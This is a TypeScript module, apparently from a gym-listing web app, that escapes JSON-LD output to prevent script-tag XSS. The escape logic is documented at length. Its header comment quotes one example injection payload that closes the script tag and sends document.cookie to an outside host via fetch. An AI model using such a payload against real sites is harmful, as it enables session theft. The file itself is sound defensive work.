/**
 * Serialising JSON-LD into a `<script>` tag without opening an XSS hole — `NFR-SEC-*`, OWASP A03.
 *
 * ┌─ `JSON.stringify` IS NOT AN HTML ESCAPER, AND THIS IS THE CASE WHERE THAT BITES ────────────┐
 * │ `JSON.stringify` escapes `"` and `\` because JSON requires it. It does NOT escape `<` or `/`, │
 * │ because JSON does not care about them. Inside a `<script>` element the HTML parser is still   │
 * │ scanning for `</script`, so a gym description containing                                     │
 * │                                                                                              │
 * │     </script><script>fetch('https://…/?c='+document.cookie)</script>                          │
 * │                                                                                              │
 * │ closes our tag and opens theirs. The JSON is perfectly valid; the page is compromised.        │
 * │                                                                                              │
 * │ This is not hypothetical for this particular tag. Every field it emits — `name`, `about`,     │
 * │ `address`, `openingHours` — is text a GYM OWNER types into their own profile. The fixture     │
 * │ catalogue that feeds it today is handwritten, which is exactly why the hole was invisible:    │
 * │ the payload arrives the day the fixture is swapped for the database, and the swap is a data   │
 * │ change that no test would flag as a security change.                                          │
 * └──────────────────────────────────────────────────────────────────────────────────────────────┘
 *
 * ┌─ WHY REPLACE RATHER THAN STRIP OR REJECT ───────────────────────────────────────────────────┐
 * │ The escapes below are `\uXXXX` sequences, which JSON parsers — including every search         │
 * │ engine's — decode back to the original character. So Google reads the gym's description       │
 * │ exactly as written, and the HTML parser never sees a `<`. Stripping the characters would      │
 * │ silently corrupt a legitimate description ("Open 6<8 members per class"); rejecting the gym   │
 * │ would take a listing offline over a punctuation mark.                                          │
 * └──────────────────────────────────────────────────────────────────────────────────────────────┘
 *
 * Local to this app rather than in `packages/utils`: one caller, one surface. §12's kernel
 * admission test exists to stop pure functions being promoted before a second consumer proves the
 * shape is right. When the gym dashboard emits JSON-LD too, that is the moment it graduates.
 */

/**
 * Characters that mean something to the HTML parser but nothing to JSON.
 *
 * - `<` and `>` — `</script` is the tag-closing sequence the parser hunts for.
 * - `&` — so an entity in the source cannot be re-interpreted after decoding.
 * - `U+2028` / `U+2029` — legal in JSON strings and ILLEGAL in JavaScript source before ES2019.
 *   Not an escape from the script tag, but they break the parse in older engines, which turns a
 *   gym's description into a blank page for the visitor whose browser is three years old.
 */
/**
 * The escape table.
 *
 * ┌─ THE TWO SEPARATORS ARE BUILT FROM CODE POINTS, NOT TYPED ─────────────────────────────────┐
 * │ `String.fromCharCode(0x2028)` rather than the character itself, so this file contains no    │
 * │ invisible line terminator of its own. A raw U+2028 pasted here would be unreadable in every │
 * │ editor and, being a line terminator to an older parser, could break the very module that    │
 * │ exists to stop it breaking a page.                                                           │
 * └────────────────────────────────────────────────────────────────────────────────────────────┘
 */
const LINE_SEPARATOR = String.fromCharCode(0x2028);
const PARAGRAPH_SEPARATOR = String.fromCharCode(0x2029);

const ESCAPES: Readonly<Record<string, string>> = {
  '<': '\\u003c',
  '>': '\\u003e',
  '&': '\\u0026',
  [LINE_SEPARATOR]: '\\u2028',
  [PARAGRAPH_SEPARATOR]: '\\u2029',
};

// Derived from the table, so a character can never be listed in one and missing from the other.
const UNSAFE_IN_SCRIPT = new RegExp(`[${Object.keys(ESCAPES).join('')}]`, 'g');

/**
 * A JSON-LD payload, safe to place inside `<script type="application/ld+json">`.
 *
 * Returns the serialised string rather than taking the element, so it is testable without a
 * renderer — and so the one line that does the escaping cannot be forgotten at a second call site
 * the way a "remember to escape" convention always is.
 */
export function toJsonLd(payload: unknown): string {
  return JSON.stringify(payload).replace(
    UNSAFE_IN_SCRIPT,
    (character) => ESCAPES[character] ?? character,
  );
}
